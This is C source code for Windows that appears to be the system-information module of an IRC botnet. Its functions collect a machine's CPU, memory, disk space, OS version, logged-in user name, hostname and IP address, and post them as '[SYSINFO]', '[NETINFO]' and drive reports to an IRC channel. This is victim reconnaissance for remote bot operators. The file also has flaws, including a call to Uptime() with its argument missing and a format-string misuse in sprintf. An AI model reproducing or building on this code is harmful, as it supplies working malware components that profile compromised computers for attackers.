#include "includes.h"
#include "functions.h"
#include "externs.h"

char *Uptime(int startup)
{
	static char buffer[50];

	DWORD total = GetTickCount() / 1000 - startup;
	DWORD days = total / 86400;
	DWORD hours = (total % 86400) / 3600;
	DWORD minutes = ((total % 86400) % 3600) / 60;
	
	_snprintf(buffer, sizeof(buffer), "%dd %dh %dm", days, hours, minutes);

	return (buffer);
}

int OSVersionCheck(void)
{ 
	DWORD dwRet = OS_UNKNOWN;

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&verinfo)) {
		if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwRet = OS_WIN95;
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) dwRet = OS_WINNT;
		}
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) dwRet = OS_WIN98;
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) dwRet = OS_WINME;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) dwRet = OS_WIN2K;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) dwRet = OS_WINXP;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) dwRet = OS_WIN2K3;
		else dwRet = OS_UNKNOWN;
	} else 
		dwRet = OS_UNKNOWN;

	return (dwRet);
}

#ifndef NO_SYSINFO

// asm for cpuspeed() (used for counting cpu cycles)
#pragma warning( disable : 4035 )
inline unsigned __int64 GetCycleCount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning( default : 4035 )

// cpu speed function
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}

// function used for sysinfo
char *sysinfo(char *sinfo, SOCKET sock)
{
	char *os="", os2[140];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}

	DWORD cchBuff = 256; // check this, could be sizeof CurrentUser
	char CurrentUser[256]="?";
	if(fGetUserName)
		fGetUserName(CurrentUser, &cchBuff);

	char hostname[250];
	DWORD addr = finet_addr(GetIP(sock));  
	HOSTENT *hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       sprintf(hostname,hostent->h_name);
    else 
		sprintf(hostname,"couldn't resolve host");

	char sysdir[MAX_PATH];
    GetSystemDirectory(sysdir,sizeof(sysdir));

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	MEMORYSTATUS memstat;
	memset(&memstat, 0, sizeof(memstat));
	GlobalMemoryStatus(&memstat); // load memory info into memstat

	char drive[10];
	_splitpath(sysdir, drive, NULL, NULL, NULL);
	DKSPKB dkspkb=DiskSpaceKB(drive);

	_snprintf(sinfo, IRCLINE, "[SYSINFO]: [CPU]: %I64uMHz. [RAM]: %sKB total, %sKB free. [Disk]: %s total, %s free. [OS]: Windows %s (%d.%d, Build %d). [Sysdir]: %s. [Hostname]: %s (%s). [Current User]: %s. [Date]: %s. [Time]: %s. [Uptime]: %s.",
		GetCPUSpeed(), commaI64(memstat.dwTotalPhys / 1024), commaI64(memstat.dwAvailPhys / 1024), dkspkb.TotalKB, dkspkb.FreeKB, os, 
		verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, sysdir, hostname, GetIP(sock), CurrentUser, date, time, Uptime());

	return (sinfo); // return the sysinfo string
}
#endif

#ifndef NO_NETINFO

// function used for netinfo
char *netinfo(char *ninfo, char *host, SOCKET sock)
{
	DWORD n;
	char ctype[8], cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) 
			sprintf(ctype, "Dial-up");
	 	else 
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	_snprintf(ninfo, IRCLINE, "[NETINFO]: [Type]: %s (%s). [IP Address]: %s. [Hostname]: %s.", ctype, cname, GetIP(sock), host);

	return (ninfo); // return the netinfo string
}
#endif

////////////////////////////// DRIVE INFO //////////////////////////////////

BOOL FileExists(char *filename, int mode) 
{ 
	return (_access(filename, mode) != -1);
} 

const char *commaI64(unsigned __int64 number)
{
	const int size = 50;
	int counter = 0;

	static char str[size];
	memset(str, 0, sizeof(str));

	char tempStr[size];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return (str);
}

const char *DriveType(LPCSTR Drive)
{
	switch(fGetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}

DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;

	if (fGetDiskFreeSpaceEx)
		fGetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);

	return (dksp);
}

DKSPKB DiskSpaceKB(LPCSTR Drive)
{
	DKSPKB dkspkb;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspkb.AvailableKB, "failed");
		sprintf(dkspkb.FreeKB, "failed");
		sprintf(dkspkb.TotalKB, "failed");
	} else {
		_snprintf(dkspkb.AvailableKB,sizeof(dkspkb.AvailableKB),"%sKB",commaI64(dksp.AvailableBytes/1024));
		_snprintf(dkspkb.FreeKB,sizeof(dkspkb.FreeKB),"%sKB",commaI64(dksp.FreeBytes/1024));
		_snprintf(dkspkb.TotalKB,sizeof(dkspkb.TotalKB),"%sKB",commaI64(dksp.TotalBytes/1024));
	}

	return (dkspkb);
}

void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	char sendbuf[IRCLINE];

	DKSPKB dkspkb=DiskSpaceKB(Drive);

	if (strcmp(dkspkb.TotalKB,"failed") == 0)
		_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: %s Drive (%s): Failed to stat, device not ready.", DriveType(Drive), Drive);
	else
		_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: %s Drive (%s): %s total, %s free, %s available.", DriveType(Drive), Drive, dkspkb.TotalKB, dkspkb.FreeKB, dkspkb.AvailableKB);
	irc_privmsg(sock, chan, sendbuf, notice, TRUE); 
//	addlog(sendbuf);

	return;
}

void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	if (Drive) {
		DriveSpace(sock, chan, notice, Drive);
	} else {
		DWORD dwSize = fGetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		fGetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0)
				DriveSpace(sock, chan, notice, pszDrv);
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return;
}

